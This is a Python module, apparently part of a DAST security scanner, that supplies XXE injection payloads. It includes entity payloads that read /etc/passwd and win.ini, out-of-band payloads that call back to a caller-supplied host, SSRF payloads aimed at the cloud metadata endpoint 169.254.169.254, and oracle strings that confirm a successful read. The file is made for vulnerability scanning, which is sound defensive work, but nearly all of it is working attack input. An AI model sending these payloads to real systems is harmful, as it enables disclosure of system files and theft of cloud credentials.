"""
DevSecure360 — DAST XXE Payloads
====================================
XML External Entity Injection payload set.
Sources: OWASP XXE Prevention Cheat Sheet, PayloadsAllTheThings XXE corpus.
"""


def get_file_read_payloads() -> list:
    """Payloads to read local files via XXE."""
    return [
        # Linux /etc/passwd
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",

        # Windows win.ini
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>""",

        # Parameter entity variant
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>""",
    ]


def get_oob_payloads(oob_url: str, canary_id: str) -> list:
    """OOB payloads that trigger HTTP callbacks (for blind XXE)."""
    return [
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_url}/{canary_id}">]><foo>&xxe;</foo>""",
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob_url}/{canary_id}">%xxe;]><foo/>""",
    ]


def get_ssrf_via_xxe_payloads(oob_url: str, canary_id: str) -> list:
    """Use XXE as a vector for SSRF."""
    return [
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_url}/{canary_id}">]><foo>&xxe;</foo>""",
        f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
    ]


XXE_ORACLE_STRINGS = ["root:x:0:0:", "[extensions]", "[boot loader]"]
